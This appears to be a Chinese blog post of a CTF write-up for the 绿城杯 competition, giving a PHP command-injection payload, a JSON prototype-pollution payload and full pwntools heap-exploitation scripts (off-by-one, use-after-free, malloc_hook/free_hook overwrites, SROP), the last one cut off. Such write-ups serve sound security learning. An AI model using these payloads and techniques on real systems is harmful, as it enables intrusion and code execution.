<!DOCTYPE html><html lang="zh-CN" data-theme="light"><head><meta charset="UTF-8"><meta http-equiv="X-UA-Compatible" content="IE=edge"><meta name="viewport" content="width=device-width,initial-scale=1"><title>绿城杯WP | Riddler Blog</title><meta name="author" content="Riddler"><meta name="copyright" content="Riddler"><meta name="format-detection" content="telephone=no"><meta name="theme-color" content="#ffffff"><meta name="description" content="NYNUSEC战队一、战队信息 名称：NYNUSEC 排名：14  二、解题情况 三、解题过程 题目按照顺序填写  Web题目三http:&#x2F;&#x2F;0a21d3d6-a899-4595-aff9-d2344a56cf98.zzctf.dasctf.com&#x2F;?link_page&#x3D;about 打开题目，根据网页的关键字搜索到相关题目。 https:&#x2F;&#x2F;blog.csdn.net&#x2F;qq_51071059&#x2F;ar">
<meta property="og:type" content="article">
<meta property="og:title" content="绿城杯WP">
<meta property="og:url" content="http://riddlerm.github.io/2022/01/04/%E7%BB%BF%E5%9F%8E%E6%9D%AFWP/index.html">
<meta property="og:site_name" content="Riddler Blog">
<meta property="og:description" content="NYNUSEC战队一、战队信息 名称：NYNUSEC 排名：14  二、解题情况 三、解题过程 题目按照顺序填写  Web题目三http:&#x2F;&#x2F;0a21d3d6-a899-4595-aff9-d2344a56cf98.zzctf.dasctf.com&#x2F;?link_page&#x3D;about 打开题目，根据网页的关键字搜索到相关题目。 https:&#x2F;&#x2F;blog.csdn.net&#x2F;qq_51071059&#x2F;ar">
<meta property="og:locale" content="zh_CN">
<meta property="og:image" content="https://cdn.jsdelivr.net/npm/butterfly-extsrc@1/img/default.jpg">
<meta property="article:published_time" content="2022-01-03T17:56:23.000Z">
<meta property="article:modified_time" content="2022-01-03T17:57:00.289Z">
<meta property="article:author" content="Riddler">
<meta name="twitter:card" content="summary">
<meta name="twitter:image" content="https://cdn.jsdelivr.net/npm/butterfly-extsrc@1/img/default.jpg"><link rel="shortcut icon" href="/img/favicon.png"><link rel="canonical" href="http://riddlerm.github.io/2022/01/04/%E7%BB%BF%E5%9F%8E%E6%9D%AFWP/"><link rel="preconnect" href="//cdn.jsdelivr.net"/><link rel="preconnect" href="//hm.baidu.com"/><link rel="preconnect" href="//busuanzi.ibruce.info"/><link rel="stylesheet" href="/css/index.css"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/@fortawesome/fontawesome-free/css/all.min.css" media="print" onload="this.media='all'"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/instantsearch.js@2.10.5/dist/instantsearch.min.css" media="print" onload="this.media='all'"><script src="https://cdn.jsdelivr.net/npm/instantsearch.js@2.10.5/dist/instantsearch.min.js" defer></script><script>var _hmt = _hmt || [];
(function() {
  var hm = document.createElement("script");
  hm.src = "https://hm.baidu.com/hm.js?f81b5d84e4bdc4af11ff40d4ae8aee38";
  var s = document.getElementsByTagName("script")[0]; 
  s.parentNode.insertBefore(hm, s);
})();
</script><script>const GLOBAL_CONFIG = { 
  root: '/',
  algolia: {"appId":"CGPIG604DI","apiKey":"e50317aef2bf77a1f663422684b2a897","indexName":"blogsearch","hits":{"per_page":6},"languages":{"input_placeholder":"搜索文章","hits_empty":"找不到您查询的内容：${query}","hits_stats":"找到 ${hits} 条结果，用时 ${time} 毫秒"}},
  localSearch: undefined,
  translate: undefined,
  noticeOutdate: undefined,
  highlight: {"plugin":"highlighjs","highlightCopy":true,"highlightLang":true,"highlightHeightLimit":200},
  copy: {
    success: '复制成功',
    error: '复制错误',
    noSupport: '浏览器不支持'
  },
  relativeDate: {
    homepage: false,
    post: false
  },
  runtime: '天',
  date_suffix: {
    just: '刚刚',
    min: '分钟前',
    hour: '小时前',
    day: '天前',
    month: '个月前'
  },
  copyright: undefined,
  lightbox: 'fancybox',
  Snackbar: undefined,
  source: {
    jQuery: 'https://cdn.jsdelivr.net/npm/jquery@latest/dist/jquery.min.js',
    justifiedGallery: {
      js: 'https://cdn.jsdelivr.net/npm/justifiedGallery/dist/js/jquery.justifiedGallery.min.js',
      css: 'https://cdn.jsdelivr.net/npm/justifiedGallery/dist/css/justifiedGallery.min.css'
    },
    fancybox: {
      js: 'https://cdn.jsdelivr.net/npm/@fancyapps/fancybox@latest/dist/jquery.fancybox.min.js',
      css: 'https://cdn.jsdelivr.net/npm/@fancyapps/fancybox@latest/dist/jquery.fancybox.min.css'
    }
  },
  isPhotoFigcaption: false,
  islazyload: false,
  isanchor: false
}</script><script id="config-diff">var GLOBAL_CONFIG_SITE = {
  title: '绿城杯WP',
  isPost: true,
  isHome: false,
  isHighlightShrink: false,
  isToc: true,
  postUpdate: '2022-01-04 01:57:00'
}</script><noscript><style type="text/css">
  #nav {
    opacity: 1
  }
  .justified-gallery img {
    opacity: 1
  }

  #recent-posts time,
  #post-meta time {
    display: inline !important
  }
</style></noscript><script>(win=>{
    win.saveToLocal = {
      set: function setWithExpiry(key, value, ttl) {
        if (ttl === 0) return
        const now = new Date()
        const expiryDay = ttl * 86400000
        const item = {
          value: value,
          expiry: now.getTime() + expiryDay,
        }
        localStorage.setItem(key, JSON.stringify(item))
      },

      get: function getWithExpiry(key) {
        const itemStr = localStorage.getItem(key)

        if (!itemStr) {
          return undefined
        }
        const item = JSON.parse(itemStr)
        const now = new Date()

        if (now.getTime() > item.expiry) {
          localStorage.removeItem(key)
          return undefined
        }
        return item.value
      }
    }
  
    win.getScript = url => new Promise((resolve, reject) => {
      const script = document.createElement('script')
      script.src = url
      script.async = true
      script.onerror = reject
      script.onload = script.onreadystatechange = function() {
        const loadState = this.readyState
        if (loadState && loadState !== 'loaded' && loadState !== 'complete') return
        script.onload = script.onreadystatechange = null
        resolve()
      }
      document.head.appendChild(script)
    })
  
      win.activateDarkMode = function () {
        document.documentElement.setAttribute('data-theme', 'dark')
        if (document.querySelector('meta[name="theme-color"]') !== null) {
          document.querySelector('meta[name="theme-color"]').setAttribute('content', '#0d0d0d')
        }
      }
      win.activateLightMode = function () {
        document.documentElement.setAttribute('data-theme', 'light')
        if (document.querySelector('meta[name="theme-color"]') !== null) {
          document.querySelector('meta[name="theme-color"]').setAttribute('content', '#ffffff')
        }
      }
      const t = saveToLocal.get('theme')
    
          if (t === 'dark') activateDarkMode()
          else if (t === 'light') activateLightMode()
        
      const asideStatus = saveToLocal.get('aside-status')
      if (asideStatus !== undefined) {
        if (asideStatus === 'hide') {
          document.documentElement.classList.add('hide-aside')
        } else {
          document.documentElement.classList.remove('hide-aside')
        }
      }
    
    const detectApple = () => {
      if (GLOBAL_CONFIG_SITE.isHome && /iPad|iPhone|iPod|Macintosh/.test(navigator.userAgent)){
        document.documentElement.classList.add('apple')
      }
    }
    detectApple()
    })(window)</script><meta name="generator" content="Hexo 6.0.0"></head><body><div id="sidebar"><div id="menu-mask"></div><div id="sidebar-menus"><div class="avatar-img is-center"><img src="http://thirdqq.qlogo.cn/g?b=oidb&amp;k=LMGBgwOams2fZdeTFTEk8g&amp;s=100" onerror="onerror=null;src='/img/friend_404.gif'" alt="avatar"/></div><div class="site-data"><div class="data-item is-center"><div class="data-item-link"><a href="/archives/"><div class="headline">文章</div><div class="length-num">2</div></a></div></div></div><hr/><div class="menus_items"><div class="menus_item"><a class="site-page" href="/"><i class="fa-fw fas fa-home"></i><span> 首页</span></a></div><div class="menus_item"><a class="site-page" href="/archives/"><i class="fa-fw fas fa-archive"></i><span> 时间轴</span></a></div><div class="menus_item"><a class="site-page" href="/tags/"><i class="fa-fw fas fa-tags"></i><span> 标签</span></a></div><div class="menus_item"><a class="site-page" href="/categories/"><i class="fa-fw fas fa-folder-open"></i><span> 分类</span></a></div><div class="menus_item"><a class="site-page" href="javascript:void(0);"><i class="fa-fw fas fa-list"></i><span> 清单</span><i class="fas fa-chevron-down expand"></i></a><ul class="menus_item_child"><li><a class="site-page child" href="/music/"><i class="fa-fw fas fa-music"></i><span> 音乐</span></a></li><li><a class="site-page child" href="/movies/"><i class="fa-fw fas fa-video"></i><span> 电影</span></a></li></ul></div><div class="menus_item"><a class="site-page" href="/link/"><i class="fa-fw fas fa-link"></i><span> 友链</span></a></div><div class="menus_item"><a class="site-page" href="/about/"><i class="fa-fw fas fa-heart"></i><span> 关于</span></a></div></div></div></div><div class="post" id="body-wrap"><header class="post-bg" id="page-header" style="background-image: url('https://cdn.jsdelivr.net/npm/butterfly-extsrc@1/img/default.jpg')"><nav id="nav"><span id="blog_name"><a id="site-name" href="/">Riddler Blog</a></span><div id="menus"><div id="search-button"><a class="site-page social-icon search"><i class="fas fa-search fa-fw"></i><span> 搜索</span></a></div><div class="menus_items"><div class="menus_item"><a class="site-page" href="/"><i class="fa-fw fas fa-home"></i><span> 首页</span></a></div><div class="menus_item"><a class="site-page" href="/archives/"><i class="fa-fw fas fa-archive"></i><span> 时间轴</span></a></div><div class="menus_item"><a class="site-page" href="/tags/"><i class="fa-fw fas fa-tags"></i><span> 标签</span></a></div><div class="menus_item"><a class="site-page" href="/categories/"><i class="fa-fw fas fa-folder-open"></i><span> 分类</span></a></div><div class="menus_item"><a class="site-page" href="javascript:void(0);"><i class="fa-fw fas fa-list"></i><span> 清单</span><i class="fas fa-chevron-down expand"></i></a><ul class="menus_item_child"><li><a class="site-page child" href="/music/"><i class="fa-fw fas fa-music"></i><span> 音乐</span></a></li><li><a class="site-page child" href="/movies/"><i class="fa-fw fas fa-video"></i><span> 电影</span></a></li></ul></div><div class="menus_item"><a class="site-page" href="/link/"><i class="fa-fw fas fa-link"></i><span> 友链</span></a></div><div class="menus_item"><a class="site-page" href="/about/"><i class="fa-fw fas fa-heart"></i><span> 关于</span></a></div></div><div id="toggle-menu"><a class="site-page"><i class="fas fa-bars fa-fw"></i></a></div></div></nav><div id="post-info"><h1 class="post-title">绿城杯WP</h1><div id="post-meta"><div class="meta-firstline"><span class="post-meta-date"><i class="far fa-calendar-alt fa-fw post-meta-icon"></i><span class="post-meta-label">发表于</span><time class="post-meta-date-created" datetime="2022-01-03T17:56:23.000Z" title="发表于 2022-01-04 01:56:23">2022-01-04</time><span class="post-meta-separator">|</span><i class="fas fa-history fa-fw post-meta-icon"></i><span class="post-meta-label">更新于</span><time class="post-meta-date-updated" datetime="2022-01-03T17:57:00.289Z" title="更新于 2022-01-04 01:57:00">2022-01-04</time></span></div><div class="meta-secondline"><span class="post-meta-separator">|</span><span class="post-meta-pv-cv" id="" data-flag-title="绿城杯WP"><i class="far fa-eye fa-fw post-meta-icon"></i><span class="post-meta-label">阅读量:</span><span id="busuanzi_value_page_pv"></span></span></div></div></div></header><main class="layout" id="content-inner"><div id="post"><article class="post-content" id="article-container"><h1 id="NYNUSEC战队"><a href="#NYNUSEC战队" class="headerlink" title="NYNUSEC战队"></a>NYNUSEC战队</h1><h2 id="一、战队信息"><a href="#一、战队信息" class="headerlink" title="一、战队信息"></a>一、战队信息</h2><ul>
<li>名称：NYNUSEC</li>
<li>排名：14</li>
</ul>
<h2 id="二、解题情况"><a href="#二、解题情况" class="headerlink" title="二、解题情况"></a>二、解题情况</h2><p><a target="_blank" rel="noopener" href="https://i.loli.net/2021/10/09/aJXKQpLcMk4VwSN.png"><img src="https://i.loli.net/2021/10/09/aJXKQpLcMk4VwSN.png"></a></p>
<h3 id="三、解题过程"><a href="#三、解题过程" class="headerlink" title="三、解题过程"></a>三、解题过程</h3><blockquote>
<p>题目按照顺序填写</p>
</blockquote>
<h3 id="Web"><a href="#Web" class="headerlink" title="Web"></a>Web</h3><h4 id="题目三"><a href="#题目三" class="headerlink" title="题目三"></a>题目三</h4><p><a target="_blank" rel="noopener" href="http://0a21d3d6-a899-4595-aff9-d2344a56cf98.zzctf.dasctf.com/?link_page=about">http://0a21d3d6-a899-4595-aff9-d2344a56cf98.zzctf.dasctf.com/?link_page=about</a></p>
<p>打开题目，根据网页的关键字搜索到相关题目。</p>
<p><a target="_blank" rel="noopener" href="https://blog.csdn.net/qq_51071059/article/details/110629106">https://blog.csdn.net/qq_51071059/article/details/110629106</a></p>
<p><a target="_blank" rel="noopener" href="https://i.loli.net/2021/10/09/qJsHRamD6QwkYEM.png"><img src="https://i.loli.net/2021/10/09/qJsHRamD6QwkYEM.png"></a></p>
<p>直接复制payload 跑一下</p>
<p><code>&#39;) or system(&quot;cat templates/flag.php&quot;);//</code></p>
<p><a target="_blank" rel="noopener" href="http://0a21d3d6-a899-4595-aff9-d2344a56cf98.zzctf.dasctf.com/?link_page=)%20or%20system(%22cat%20templates/flag.php%22);//">http://0a21d3d6-a899-4595-aff9-d2344a56cf98.zzctf.dasctf.com/?link_page=)%20or%20system(%22cat%20templates/flag.php%22);//</a></p>
<p>提示不存在此文件</p>
<p><a target="_blank" rel="noopener" href="https://i.loli.net/2021/10/09/OQonqup3HJiNmzL.png"><img src="https://i.loli.net/2021/10/09/OQonqup3HJiNmzL.png"></a></p>
<p>通过ls命令，找到flag.php所在目录</p>
<p><a target="_blank" rel="noopener" href="https://0a21d3d6-a899-4595-aff9-d2344a56cf98.zzctf.dasctf.com/?link_page=%27)%20or%20system(%22ls%20/var/www/html/pages%22);//">https://0a21d3d6-a899-4595-aff9-d2344a56cf98.zzctf.dasctf.com/?link_page=%27)%20or%20system(%22ls%20/var/www/html/pages%22);//</a></p>
<p><a target="_blank" rel="noopener" href="https://i.loli.net/2021/10/10/y7185hBumTDURYE.png"><img src="https://i.loli.net/2021/10/10/y7185hBumTDURYE.png"></a></p>
<p>重新构造payload</p>
<p><a target="_blank" rel="noopener" href="http://0a21d3d6-a899-4595-aff9-d2344a56cf98.zzctf.dasctf.com/?link_page=%27)%20or%20system(%22cat%20/var/www/html/pages/flag.php%22);//">http://0a21d3d6-a899-4595-aff9-d2344a56cf98.zzctf.dasctf.com/?link_page=%27)%20or%20system(%22cat%20/var/www/html/pages/flag.php%22);//</a></p>
<p>得到flag</p>
<blockquote>
<p><code>DASCTF&#123;f337303e16ecb010803609b478e8f3d8&#125;</code></p>
</blockquote>
<p><a target="_blank" rel="noopener" href="https://i.loli.net/2021/10/09/ZplzShiwHuQJ3n7.png"><img src="https://i.loli.net/2021/10/09/ZplzShiwHuQJ3n7.png"></a></p>
<h4 id="题目四"><a href="#题目四" class="headerlink" title="题目四"></a>题目四</h4><p><a target="_blank" rel="noopener" href="https://i.loli.net/2021/10/10/mpGQWt9PB4JkEwn.png"><img src="https://i.loli.net/2021/10/10/mpGQWt9PB4JkEwn.png"></a></p>
<p>查看网页源码发现有源码文件，下载后解压得到<code>config.js</code></p>
<p><a target="_blank" rel="noopener" href="https://i.loli.net/2021/10/09/NKV7b3pcfoiRJdX.png"><img src="https://i.loli.net/2021/10/09/NKV7b3pcfoiRJdX.png"></a></p>
<p>根据代码找到了两篇相关的文章，</p>
<p><a target="_blank" rel="noopener" href="https://blog.zeddyu.info/2020/10/15/Defcon28final/#nooode">https://blog.zeddyu.info/2020/10/15/Defcon28final/#nooode</a></p>
<p><a target="_blank" rel="noopener" href="https://0day.design/2020/08/11/defcon%20CTF%20Final%20Web%20WriteUp/">https://0day.design/2020/08/11/defcon%20CTF%20Final%20Web%20WriteUp/</a></p>
<p>直接使用blog里的payload，发现返回404。</p>
<p><code>&#123;&quot;$schema&quot;: &#123;&quot;properties&quot;: &#123;&quot;__proto__&quot;: &#123;&quot;properties&quot;: &#123;&quot;path&quot;: &#123;&quot;default&quot;: &quot;/flag&quot;&#125;&#125;&#125;&#125;&#125;&#125;</code></p>
<p><a target="_blank" rel="noopener" href="https://i.loli.net/2021/10/09/PNTJBkazFMsCWK5.png"><img src="https://i.loli.net/2021/10/09/PNTJBkazFMsCWK5.png"></a></p>
<p><a target="_blank" rel="noopener" href="https://i.loli.net/2021/10/09/pLbvKxfUHTz637c.png"><img src="https://i.loli.net/2021/10/09/pLbvKxfUHTz637c.png"></a></p>
<p>尝试把config去掉，再打一次，得到flag</p>
<p><a target="_blank" rel="noopener" href="https://i.loli.net/2021/10/10/rOnVhzwAWT6mMxg.png"><img src="https://i.loli.net/2021/10/10/rOnVhzwAWT6mMxg.png"></a></p>
<blockquote>
<p><code>DASCTF&#123;5117143e660f592adc982dd96d2c3f17&#125;</code></p>
</blockquote>
<h3 id="PWN"><a href="#PWN" class="headerlink" title="PWN"></a>PWN</h3><h4 id="null"><a href="#null" class="headerlink" title="null"></a>null</h4><p>1，这题没给libc，于是盲猜是2.23<br>2，放到ida里发现就是常规的菜单题，存在off-by-one<br>3，堆重叠泄露出libc的基址，用fastbin打malloc_hook-0x23处，把堆块申请到malloc_hook附近，然后用realloc调栈</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">pwn <span class="keyword">import</span> *</span><br><span class="line">p = process(<span class="string">&quot;./null_pwn&quot;</span>)</span><br><span class="line">p = remote(<span class="string">&quot;82.157.5.28&quot;</span>,<span class="number">50604</span>) </span><br><span class="line">context.log_level = <span class="string">&quot;debug&quot;</span></span><br><span class="line">elf = ELF(<span class="string">&quot;./null_pwn&quot;</span>)</span><br><span class="line">libc = elf.libc</span><br><span class="line">heaparray = <span class="number">0x602120</span></span><br><span class="line">sizearray = <span class="number">0x6020E0</span></span><br><span class="line">menu = <span class="string">&quot;Your choice :&quot;</span></span><br><span class="line">inde=<span class="string">&quot;Index:&quot;</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">add</span>(<span class="params">index,size,content</span>):</span></span><br><span class="line"> p.sendafter(menu,<span class="string">&quot;1&quot;</span>)</span><br><span class="line"> p.sendafter(inde,<span class="built_in">str</span>(index))</span><br><span class="line"> p.sendafter(<span class="string">&quot;Size of Heap : &quot;</span>,<span class="built_in">str</span>(size))</span><br><span class="line"> p.sendafter(<span class="string">&quot;Content?:&quot;</span>,content)</span><br><span class="line">add(<span class="number">0</span>,<span class="number">0x18</span>,<span class="string">&quot;a&quot;</span>) </span><br><span class="line">add(<span class="number">1</span>,<span class="number">0x68</span>,<span class="string">&quot;b&quot;</span>)</span><br><span class="line">add(<span class="number">2</span>,<span class="number">0x68</span>,<span class="string">&quot;c&quot;</span>)</span><br><span class="line">add(<span class="number">3</span>,<span class="number">0x18</span>,<span class="string">&quot;d&quot;</span>)</span><br><span class="line">p.sendafter(menu,<span class="string">&quot;3&quot;</span>)</span><br><span class="line">p.sendafter(<span class="number">0</span>,<span class="built_in">str</span>(<span class="number">0</span>))</span><br><span class="line">p.sendafter(<span class="string">&quot;Content?:&quot;</span>,<span class="string">&quot;a&quot;</span>*<span class="number">0x18</span>+<span class="string">&quot;\xe1&quot;</span>)  </span><br><span class="line">p.sendafter(menu,<span class="string">&quot;2&quot;</span>)   </span><br><span class="line">p.sendafter(inde,<span class="built_in">str</span>(<span class="number">1</span>))</span><br><span class="line">add(<span class="number">4</span>,<span class="number">0x68</span>,<span class="string">&quot;a&quot;</span>)</span><br><span class="line">p.sendafter(menu,<span class="string">&quot;4&quot;</span>)</span><br><span class="line">p.sendafter(inde,<span class="built_in">str</span>(<span class="number">2</span>))</span><br><span class="line">p.recvuntil(<span class="string">&quot;Content : &quot;</span>)</span><br><span class="line">libc_base = u64(p.recvuntil(<span class="string">&quot;\x7f&quot;</span>)[-<span class="number">6</span>:].ljust(<span class="number">8</span>,<span class="string">&quot;\x00&quot;</span>)) - libc.sym[<span class="string">&quot;__malloc_hook&quot;</span>] - <span class="number">0x68</span></span><br><span class="line">add(<span class="number">5</span>,<span class="number">0x68</span>,<span class="string">&quot;a&quot;</span>)	    </span><br><span class="line">p.sendafter(menu,<span class="string">&quot;2&quot;</span>) <span class="comment">#2</span></span><br><span class="line">p.sendafter(inde,<span class="built_in">str</span>(<span class="number">5</span>))</span><br><span class="line">p.sendafter(menu,<span class="string">&quot;3&quot;</span>)</span><br><span class="line">p.sendafter(<span class="number">2</span>,<span class="built_in">str</span>(<span class="number">2</span>))</span><br><span class="line">p.sendafter(<span class="string">&quot;Content?:&quot;</span>,p64(libc_base+libc.sym[<span class="string">&quot;__malloc_hook&quot;</span>]-<span class="number">0x23</span>))  <span class="comment">#off-by-one</span></span><br><span class="line">add(<span class="number">6</span>,<span class="number">0x68</span>,<span class="string">&quot;aa&quot;</span>)</span><br><span class="line">add(<span class="number">7</span>,<span class="number">0x68</span>,<span class="string">&quot;a&quot;</span>*<span class="number">11</span>+p64(libc_base+<span class="number">0x4527a</span>)+p64(libc_base+libc.sym[<span class="string">&quot;__libc_realloc&quot;</span>]+<span class="number">1</span>))</span><br><span class="line">p.sendafter(menu,<span class="string">&quot;1&quot;</span>)</span><br><span class="line">p.sendafter(<span class="string">&quot;:&quot;</span>,<span class="string">&quot;7&quot;</span>)</span><br><span class="line">p.recvuntil(<span class="string">&quot;:&quot;</span>)</span><br><span class="line">p.sendline(<span class="string">&quot;20&quot;</span>)</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>

<p><a target="_blank" rel="noopener" href="https://i.loli.net/2021/10/09/uFWUDKx1zcdSikG.png"><img src="https://i.loli.net/2021/10/09/uFWUDKx1zcdSikG.png"></a></p>
<h4 id="uaf"><a href="#uaf" class="headerlink" title="uaf"></a>uaf</h4><p>1.漏洞如标题<br>2.将堆块释放到unsortedbin中泄露libc，用fastbin打malloc_hook-0x23，要多测几个og</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">p = process(<span class="string">&quot;./uaf_pwn&quot;</span>)</span><br><span class="line"><span class="comment"># p=remote(&quot;82.157.5.28&quot;,50702)</span></span><br><span class="line">context.log_level = <span class="string">&quot;debug&quot;</span></span><br><span class="line">elf = ELF(<span class="string">&quot;./uaf_pwn&quot;</span>)</span><br><span class="line">libc = elf.libc</span><br><span class="line">ind=<span class="string">&quot;index&gt;&quot;</span></span><br><span class="line">heaparray = <span class="built_in">int</span>(p.recvuntil(<span class="string">&quot;\n&quot;</span>).ljust(<span class="number">8</span>,<span class="string">&quot;\x00&quot;</span>),<span class="number">16</span>)</span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">add</span>(<span class="params">size</span>):</span></span><br><span class="line"> p.sendline(<span class="string">&quot;1&quot;</span>)</span><br><span class="line"> p.sendafter(<span class="string">&quot;size&gt;&quot;</span>,<span class="built_in">str</span>(size))</span><br><span class="line">add(<span class="number">0x80</span>)</span><br><span class="line">add(<span class="number">0x40</span>)</span><br><span class="line">p.sendline(<span class="string">&quot;2&quot;</span>) </span><br><span class="line">p.sendafter(ind,<span class="built_in">str</span>(<span class="number">0</span>))</span><br><span class="line">p.sendline(<span class="string">&quot;4&quot;</span>)</span><br><span class="line">p.sendafter(ind,<span class="built_in">str</span>(<span class="number">0</span>))</span><br><span class="line">__malloc_hook = u64(p.recvuntil(<span class="string">&#x27;\x7f&#x27;</span>)[-<span class="number">6</span>:].ljust(<span class="number">8</span>,<span class="string">&quot;\x00&quot;</span>)) - <span class="number">88</span> - <span class="number">0x10</span></span><br><span class="line">libc_base = __malloc_hook - libc.sym[<span class="string">&#x27;__malloc_hook&#x27;</span>]</span><br><span class="line">og = [<span class="number">0x45226</span>,<span class="number">0x4527a</span>,<span class="number">0xf03a4</span>,<span class="number">0xf1247</span>]</span><br><span class="line">add(<span class="number">0x80</span>) </span><br><span class="line">add(<span class="number">0x68</span>) </span><br><span class="line">p.sendline(<span class="string">&quot;2&quot;</span>)</span><br><span class="line">p.sendafter(ind,<span class="built_in">str</span>(<span class="number">3</span>))</span><br><span class="line">p.sendline(<span class="string">&quot;3&quot;</span>)</span><br><span class="line">p.sendafter(ind,<span class="built_in">str</span>(<span class="number">3</span>))</span><br><span class="line">p.sendafter(<span class="string">&quot;content&gt;&quot;</span>,p64(libc_base+libc.sym[<span class="string">&quot;__malloc_hook&quot;</span>]-<span class="number">0x23</span>))</span><br><span class="line">add(<span class="number">0x68</span>) </span><br><span class="line">add(<span class="number">0x68</span>)  </span><br><span class="line">p.sendline(<span class="string">&quot;3&quot;</span>)</span><br><span class="line">p.sendafter(ind,<span class="built_in">str</span>(<span class="number">5</span>))</span><br><span class="line">p.sendafter(<span class="string">&quot;content&gt;&quot;</span>,<span class="string">&quot;\x00&quot;</span>*<span class="number">0x13</span>+p64(libc_base+og[<span class="number">1</span>]))</span><br><span class="line">p64(libc_base+libc.sym[<span class="string">&quot;__malloc_hook&quot;</span>]-<span class="number">0x23</span>)</span><br><span class="line">p.sendline(<span class="string">&quot;1&quot;</span>)</span><br><span class="line">p.recvuntil(<span class="string">&quot;size&gt;&quot;</span>)</span><br><span class="line">p.sendline(<span class="string">&quot;20&quot;</span>)</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>

<p><a target="_blank" rel="noopener" href="https://i.loli.net/2021/10/10/DbxOElSJQTIMg4u.png"><img src="https://i.loli.net/2021/10/10/DbxOElSJQTIMg4u.png"></a></p>
<h4 id="green"><a href="#green" class="headerlink" title="green"></a>green</h4><p>1，uaf，libc是2.27小版本的1.2，开了沙箱<br>2，把tcache填满之后，再free同一块堆，之后add回来，就会在fd中存入main_arena地址，然后打free_hook，mprotect+shellcode 如下</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">import</span> sys</span><br><span class="line">arch =  <span class="number">64</span></span><br><span class="line">libc_path = <span class="string">&quot;.bc-2.27.so&quot;</span></span><br><span class="line">elf = ELF(<span class="string">&quot;./GreentownNote&quot;</span>)</span><br><span class="line">context.os = <span class="string">&#x27;linux&#x27;</span></span><br><span class="line">context.terminal = [<span class="string">&#x27;tmux&#x27;</span>, <span class="string">&#x27;splitw&#x27;</span>, <span class="string">&#x27;-hp&#x27;</span>, <span class="string">&#x27;65&#x27;</span>]</span><br><span class="line"><span class="comment"># p = remote(&quot;82.157.5.28&quot;,50501)</span></span><br><span class="line"><span class="keyword">if</span> libc_path:</span><br><span class="line">    libc = ELF(libc_path)</span><br><span class="line"><span class="keyword">if</span> arch == <span class="number">64</span>:</span><br><span class="line">    context.arch = <span class="string">&#x27;amd64&#x27;</span></span><br><span class="line"><span class="keyword">elif</span> arch == <span class="number">32</span>:</span><br><span class="line">    context.arch = <span class="string">&#x27;i386&#x27;</span></span><br><span class="line">bps = []</span><br><span class="line">pie = <span class="number">0</span></span><br><span class="line">_add,_free,_show = <span class="number">1</span>,<span class="number">3</span>,<span class="number">2</span></span><br><span class="line">menu = <span class="string">&quot;&gt; Your choice :&quot;</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">add</span>(<span class="params">size, content</span>):</span></span><br><span class="line"> p.sendlineafter(menu, <span class="built_in">str</span>(_add))</span><br><span class="line"> p.sendlineafter(<span class="string">&quot;&gt; Note size :&quot;</span>, <span class="built_in">str</span>(size))</span><br><span class="line"> p.sendafter(<span class="string">&quot;&gt; Content :&quot;</span>, content)</span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">free</span>(<span class="params">idx</span>):</span></span><br><span class="line"> p.sendlineafter(menu, <span class="built_in">str</span>(_free))</span><br><span class="line"> p.sendlineafter(<span class="string">&quot;| Index :&quot;</span>, <span class="built_in">str</span>(idx))</span><br><span class="line">add(<span class="number">0x80</span>, <span class="string">&#x27;aaaa&#x27;</span>) </span><br><span class="line">add(<span class="number">0x80</span>, <span class="string">&#x27;a&#x27;</span>)  </span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">8</span>):</span><br><span class="line">    free(<span class="number">0</span>)</span><br><span class="line">add(<span class="number">0x80</span>, <span class="string">&#x27;b&#x27;</span>) </span><br><span class="line">p.sendlineafter(menu, <span class="built_in">str</span>(_show))</span><br><span class="line">p.sendlineafter(<span class="string">&quot;| Index :&quot;</span>, <span class="built_in">str</span>(<span class="number">0</span>))</span><br><span class="line">leak = u64(ru(<span class="string">&#x27;\x7f&#x27;</span>)[-<span class="number">6</span>:].ljust(<span class="number">8</span>,<span class="string">&quot;\x00&quot;</span>)) - <span class="number">34</span> - <span class="number">0x10</span> - libc.sym[<span class="string">&#x27;__malloc_hook&#x27;</span>]    </span><br><span class="line">libc_base = leak</span><br><span class="line">free_hook = libc_base + libc.sym[<span class="string">&#x27;__free_hook&#x27;</span>]</span><br><span class="line">syscall = libc_base + libc.search(asm(<span class="string">&quot;syscall\nret&quot;</span>)).<span class="built_in">next</span>()</span><br><span class="line">setcontext_door = libc_base + libc.sym[<span class="string">&#x27;setcontext&#x27;</span>] + <span class="number">53</span></span><br><span class="line">fake_rsp = free_hook &amp; <span class="number">0xfffffffffffff000</span></span><br><span class="line">frame = SigreturnFrame()</span><br><span class="line">frame.rax = <span class="number">0</span></span><br><span class="line">frame.rdi = <span class="number">0</span></span><br><span class="line">frame.rsi = fake_rsp</span><br><span class="line">frame.rdx = <span class="number">0x2000</span></span><br><span class="line">frame.rsp = fake_rsp</span><br><span class="line">frame.rip = syscall</span><br><span class="line">add(<span class="number">0x90</span>, <span class="string">&#x27;a&#x27;</span>) <span class="comment"># 2</span></span><br><span class="line">free(<span class="number">2</span>)</span><br><span class="line">free(<span class="number">2</span>)</span><br><span class="line">free(<span class="number">2</span>)</span><br><span class="line">add(<span class="number">0x90</span>, p64(free_hook))</span><br><span class="line">add(<span class="number">0x90</span>, p64(<span class="number">1</span>)) <span class="comment"># 3</span></span><br><span class="line">add(<span class="number">0x90</span>, p64(setcontext_door)) <span class="comment"># 4</span></span><br><span class="line">add(<span class="number">0x300</span>, <span class="built_in">str</span>(frame)) <span class="comment"># 5</span></span><br><span class="line">free(<span class="number">5</span>)</span><br><span class="line">layout = [</span><br><span class="line">libc_base+libc.search(asm(<span class="string">&quot;pop rdi\nret&quot;</span>)).<span class="built_in">next</span>(), <span class="comment">#: pop rdi; ret;</span></span><br><span class="line">free_hook &amp; <span class="number">0xfffffffffffff000</span>,</span><br><span class="line">libc_base+libc.search(asm(<span class="string">&quot;pop 